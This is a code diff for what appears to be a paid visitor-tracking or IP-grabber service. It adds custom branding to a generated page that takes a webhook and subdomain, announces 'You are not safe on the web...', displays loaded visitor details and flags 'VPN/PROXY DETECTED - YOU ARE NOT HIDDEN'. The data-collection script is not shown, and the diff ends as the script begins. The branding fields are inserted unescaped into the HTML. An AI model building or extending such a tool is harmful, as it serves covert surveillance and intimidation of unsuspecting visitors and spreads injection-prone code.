@@ -1,37 +1,51 @@
 const Deployment = require('../models/Deployment');
+const User = require('../models/User');
 
-function generateDeployedPage(webhook, subdomain) {
+async function generateDeployedPage(webhook, subdomain, userId) {
+  // Haal user op voor branding
+  const user = await User.findById(userId);
+  const isBranded = user && (user.plan === 'elite' || user.plan === 'lifetime');
+  
+  // Branding kleuren
+  const brandColor = isBranded ? (user.brandColor || '#7c3aed') : '#7c3aed';
+  const brandName = isBranded ? (user.brandName || 'AURELIXA') : 'AURELIXA';
+  const logoUrl = isBranded ? (user.logoUrl || '') : '';
+
   return `<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AURELIXA</title>
+    <title>${brandName}</title>
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
-        body{background:#f0f8ff;min-height:100vh;display:flex;justify-content:center;align-items:center;font-family:'Segoe UI',sans-serif;padding:20px}
-        .container{max-width:750px;width:100%;text-align:center;background:white;border-radius:20px;padding:40px;box-shadow:0 20px 60px rgba(0,0,0,0.1)}
-        h1{font-size:clamp(3rem,10vw,5rem);font-weight:900;color:#1a5a8c;text-transform:uppercase;letter-spacing:3px;line-height:1;margin-bottom:10px}
+        body{background:#0a0a0f;min-height:100vh;display:flex;justify-content:center;align-items:center;font-family:'Segoe UI',sans-serif;padding:20px}
+        .container{max-width:750px;width:100%;text-align:center;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.04);border-radius:24px;padding:40px;backdrop-filter:blur(10px);box-shadow:0 20px 60px rgba(0,0,0,0.3)}
+        ${logoUrl ? `.logo-img{max-width:120px;margin-bottom:15px;border-radius:12px}` : ''}
+        h1{font-size:clamp(3rem,10vw,5rem);font-weight:900;color:${brandColor};text-transform:uppercase;letter-spacing:3px;line-height:1;margin-bottom:10px}
         .sub{font-size:clamp(1rem,3vw,1.8rem);color:#6a8aaa;font-weight:300;letter-spacing:2px;margin-bottom:30px}
-        .info-box{background:#f5faff;border:2px solid #b8d4e8;border-radius:12px;padding:20px;text-align:left;font-family:'Courier New',monospace;color:#2a5a7a;font-size:.85rem;line-height:1.9;max-height:320px;overflow-y:auto}
-        .info-box pre{margin:0;white-space:pre-wrap;font-family:inherit;color:#3a6a8a}
-        .timestamp{color:#8aabba;font-size:.7rem;border-top:1px solid #d8e8f0;padding-top:12px;margin-top:12px;text-align:right}
-        .vpn-warning{color:#e67e22;font-weight:bold;margin-top:10px;padding:8px;border:1px solid #f0d5b0;border-radius:4px;background:#fef9f0;display:none}
+        .info-box{background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.06);border-radius:12px;padding:20px;text-align:left;font-family:'Courier New',monospace;color:#c8c8e8;font-size:.85rem;line-height:1.9;max-height:320px;overflow-y:auto}
+        .info-box pre{margin:0;white-space:pre-wrap;font-family:inherit;color:#d5b8e8}
+        .timestamp{color:#666688;font-size:.7rem;border-top:1px solid rgba(255,255,255,0.06);padding-top:12px;margin-top:12px;text-align:right}
+        .vpn-warning{color:#e67e22;font-weight:bold;margin-top:10px;padding:8px;border:1px solid #f0d5b0;border-radius:4px;background:rgba(230,126,34,0.05);display:none}
         .vpn-warning.show{display:block}
+        .branding-footer{color:#444466;font-size:0.7rem;margin-top:16px;padding-top:12px;border-top:1px solid rgba(255,255,255,0.03)}
         ::-webkit-scrollbar{width:4px}
-        ::-webkit-scrollbar-track{background:#f0f8ff}
-        ::-webkit-scrollbar-thumb{background:#b8d4e8;border-radius:4px}
+        ::-webkit-scrollbar-track{background:#0a0a0f}
+        ::-webkit-scrollbar-thumb{background:${brandColor};border-radius:4px}
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>AURELIXA</h1>
+        ${logoUrl ? `<img src="${logoUrl}" alt="Logo" class="logo-img">` : ''}
+        <h1>${brandName}</h1>
         <div class="sub">You are not safe on the web...</div>
         <div class="info-box" id="infoBox">
             <pre id="infoContent">⏳ loading ...</pre>
             <div class="timestamp" id="timestampDisplay"></div>
         </div>
         <div class="vpn-warning" id="vpnWarning">⚠️ VPN/PROXY DETECTED - YOU ARE NOT HIDDEN</div>
+        ${isBranded ? `<div class="branding-footer">⚡ Powered by ${brandName}</div>` : ''}
     </div>
     <script>
         document.addEventListener('contextmenu',e=>e.preventDefault());
